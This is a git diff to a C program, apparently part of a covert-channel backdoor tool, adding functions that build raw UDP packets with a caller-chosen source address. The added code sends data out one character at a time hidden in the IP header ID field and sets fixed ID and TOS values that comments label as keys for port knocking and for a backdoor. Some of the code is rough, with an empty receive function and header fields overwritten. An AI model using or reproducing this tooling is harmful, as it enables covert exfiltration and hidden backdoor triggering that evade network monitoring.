@@ -85,6 +85,119 @@ int rand_delay(int delay) {
     return rand() % delay + 1;
 }
 
+void cover_udp_recv(){
+
+}
+void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
+
+    for(int i = 0; i<= strlen(data); i++){
+        printf("data[%d] = %c\n",i,data[i]);
+        covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i],1);
+    }
+    unsigned char *buf = 0;
+    covert_udp_send(sip,dip,sport,dport,buf, 3);
+
+}
+void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel){
+    char datagram[4096] , source_ip[32] , *pseudoheader;
+    int sending_socket;
+    struct sockaddr_in sin;
+    struct upseudo_header pseudo_header;
+    memset (datagram, 0, 4096);
+
+    if((sending_socket= socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
+        perror("Failed to create raw socket");
+        exit(1);
+    }
+
+    struct iphdr *ip_header = (struct iphdr *) datagram;
+    struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof (struct iphdr));
+
+
+    strcpy(source_ip , sip);
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(dport);
+    sin.sin_addr.s_addr = inet_addr (dip);
+    printf("data[0]%c",data[0]);
+    if(covert_channel == 1) {
+        ip_header->id = data[0];
+        printf("sending: %c\n", data[0]);
+        ip_header->tos = 0;
+    }else if(covert_channel == 2){
+        //key for port knocking
+        ip_header->id = 'l';  //enter a single ASCII character into the field
+        ip_header->tos = 'b';
+    }else if(covert_channel == 3){
+        ip_header->id = 'x';  //enter a single ASCII character into the field
+        ip_header->tos = 'x';
+    }else {
+        //key for backdoor
+        ip_header->id = 'b';  //enter a single ASCII character into the field
+        ip_header->tos = 'l';
+    }
+    ip_header->tos = 0;
+    ip_header->ihl = 5;
+    ip_header->version = 4;
+    ip_header->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr);
+    ip_header->frag_off = 0;
+    ip_header->ttl = 'b';
+    ip_header->protocol = IPPROTO_UDP;
+    ip_header->check = 0;
+    ip_header->saddr = inet_addr (source_ip);
+    ip_header->daddr = sin.sin_addr.s_addr;
+    ip_header->check = csum ((unsigned short *) datagram, ip_header->tot_len);
+
+    udp_header->source = htons (sport);
+    udp_header->dest = htons (dport);
+    udp_header->len = htons(8);
+    udp_header->check = 0;
+
+    pseudo_header.source_address = inet_addr( source_ip );
+    pseudo_header.dest_address = sin.sin_addr.s_addr;
+    pseudo_header.placeholder = 0;
+    pseudo_header.protocol = IPPROTO_UDP;
+    pseudo_header.udp_length = htons(sizeof(struct udphdr));
+
+    int pseudoheader_size = sizeof(struct upseudo_header) + sizeof(struct udphdr);
+    pseudoheader = malloc(pseudoheader_size);
+
+    memcpy(pseudoheader , (char*) &pseudo_header , sizeof (struct upseudo_header));
+    memcpy(pseudoheader + sizeof(struct upseudo_header) , udp_header , sizeof(struct udphdr));
+
+    udp_header->check = csum( (unsigned short*) pseudoheader , pseudoheader_size);
+
+    if (sendto (sending_socket, datagram, ip_header->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
+        perror("sendto failed");
+    }
+    printf ("Packet Send. Length : %d \n" , ip_header->tot_len);
+}
+
+unsigned short csum(unsigned short *ptr,int nbytes)
+{
+    register long sum;
+    unsigned short oddbyte;
+    register short answer;
+
+    sum=0;
+    while(nbytes>1) {
+        sum+=*ptr++;
+        nbytes-=2;
+    }
+    if(nbytes==1) {
+        oddbyte=0;
+        *((u_char*)&oddbyte)=*(u_char*)ptr;
+        sum+=oddbyte;
+    }
+
+    sum = (sum>>16)+(sum & 0xffff);
+    sum = sum + (sum>>16);
+    answer=(short)~sum;
+
+    return(answer);
+}
+
+
 void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel) {
     int bytes_sent;
     int sending_socket;
